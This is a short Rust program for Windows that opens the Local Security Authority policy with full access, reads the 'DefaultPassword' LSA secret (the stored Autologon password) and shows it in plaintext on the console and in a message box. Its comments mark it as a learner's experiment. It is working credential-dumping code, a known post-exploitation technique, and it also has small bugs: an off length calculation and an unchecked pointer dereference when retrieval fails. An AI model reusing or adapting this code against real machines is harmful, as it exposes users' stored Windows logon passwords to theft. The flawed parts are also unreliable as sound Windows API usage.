use std::ffi::{c_ulong, c_void};
use std::mem;
use std::mem::size_of;
use std::ptr::{null, null_mut};
use windows::{
    core::*,
    Win32::UI::WindowsAndMessaging::*,
    Win32::Foundation::UNICODE_STRING,
    Win32::System::WindowsProgramming::{uaw_wcslen, OBJECT_ATTRIBUTES},
    Win32::Security::Authentication::Identity::*
};

// ALL ACCESS BITMASK
pub const POLICY_ALL_ACCESS: c_ulong = 987_135u32; //Hopefully right, ala copy paste
fn main() {
    println!("Try to get the encrypted Autologon Password!");
    get_secret_password();
}
fn get_secret_password()  {

    let mut lsa_pointer : *mut c_void = null_mut(); // :(
    let mut object_attributes:OBJECT_ATTRIBUTES = unsafe {mem::zeroed()}; // :( Keine Ahnung ob das macht was ich vorhab
    unsafe {

        if let Err(ntstatus) = LsaOpenPolicy(None, &mut object_attributes, POLICY_ALL_ACCESS, &mut lsa_pointer){
            println!("ERROR: {ntstatus:?}");
        }
    }
    println!("DEBUG: LSA HANDLE->{lsa_pointer:?}");
    // Retrieve the password
    let mut pwstr_keyname : Vec<u16> = "DefaultPassword".encode_utf16().collect();
    pwstr_keyname.push(0);


    let keyname : UNICODE_STRING = UNICODE_STRING {
        Length: (unsafe { uaw_wcslen(pwstr_keyname.as_ptr()) } * size_of::<u16>())as u16,
        MaximumLength: (unsafe { uaw_wcslen(pwstr_keyname.as_ptr()) } * size_of::<u16>() +1)as u16,
        Buffer: PWSTR(pwstr_keyname.as_mut_ptr()),
    };

    let mut private_data: *mut UNICODE_STRING = null_mut();
    unsafe {
        if let Err(status) = LsaRetrievePrivateData(lsa_pointer,&keyname,&mut private_data){
            println!("Error retrieving private Data {status:?}");
        }
    }
    unsafe {
        let _ = LsaClose(lsa_pointer);
    }
    let password :String =  unsafe {(*private_data).Buffer.to_string().unwrap()} ;
    println!("{password:?}");

    let uitext = "Password is:\n".to_string() + &password + "\0" ;

    let lptext : PCSTR = PCSTR(uitext.as_ptr());
    unsafe {
        MessageBoxA(None,lptext, s!("Autologon Password"), MB_OK);
    }


}
